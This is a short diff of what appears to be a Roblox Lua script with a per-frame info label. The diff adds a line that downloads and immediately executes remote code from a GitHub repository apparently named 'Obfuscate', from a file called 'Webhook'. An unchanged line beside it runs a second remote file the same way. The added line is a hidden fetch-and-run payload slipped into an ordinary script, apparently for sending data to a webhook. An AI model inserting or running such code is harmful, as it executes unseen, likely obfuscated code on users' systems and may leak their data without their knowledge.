@@ -87,5 +87,5 @@ RunService.RenderStepped:Connect(function()
 	InfoLabel.Text = result
 end)
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/Obfuscate/refs/heads/main/Webhook"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/Obfuscate/refs/heads/main/Function"))()
